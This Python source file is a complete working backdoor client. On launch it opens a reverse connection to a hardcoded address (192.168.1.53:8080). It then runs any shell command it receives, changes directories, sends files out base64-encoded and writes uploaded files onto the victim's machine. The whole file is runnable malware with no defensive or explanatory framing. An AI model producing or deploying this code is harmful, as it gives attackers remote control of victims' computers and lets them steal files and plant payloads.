import socket, subprocess, json, os, base64

class Backdoor:
    def __init__(self, ip, port):
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((ip, port))

    def receive(self):
        jdata = ''
        while True:
            try:
                jdata += self.connection.recv(1024).decode()
                return json.loads(jdata)
                break
            except ValueError:
                continue
    
    def send(self, data):
        jdata = json.dumps(data)
        self.connection.send(jdata.encode())

    def execute(self, command):
        return str(subprocess.check_output(command,shell=True))

    def cd(self, path):
        os.chdir(path)
        if path == '..':
            wd = (subprocess.check_output(['cd'],shell=True)).decode().split('\\')
            path = wd[-1]
            return '[+] Changed working directory to ' + path
        else:
            return '[+] Changed working directory to ' + path + '\n'
    
    def readfile(self, path):
        with open(path, 'rb') as file:
            return base64.b64encode(file.read())
    
    def writefile(self, path, content):
        if content == '[-] No such file - Syntax Error':
            return content
        else:
            with open(path,'wb') as file:
                file.write(base64.b64decode(content.encode()))

    def run(self):
        result = ''
        while True:
            command = self.receive()
            try:
                if command[0] == 'quit':
                    exit()
                elif command[0] == 'cd' and len(command) > 1:
                    if '*' in command[1]:
                        command[1] = command[1].replace('*', ' ')
                    result = self.cd(command[1])
                elif command[0] == 'download':
                    command[1] = command[1].replace('*', ' ')
                    try:
                        result = self.readfile(command[1]).decode()
                    except:
                        result = '[-] No such file - Syntax Error'
                elif command[0] == 'upload':
                    if '*' in command[1]:
                        command[1] = command[1].replace('*', ' ')
                    self.writefile(command[3] + '\\' + (command[1].split('/'))[-1], command[-1])
                    result = '[+] File was successfully uploaded'
                else:
                    result = self.execute(command)
            except:
                result = '[-] Error during command execution'
                
            self.send(result)

backdoor = Backdoor('192.168.1.53', 8080)
backdoor.run()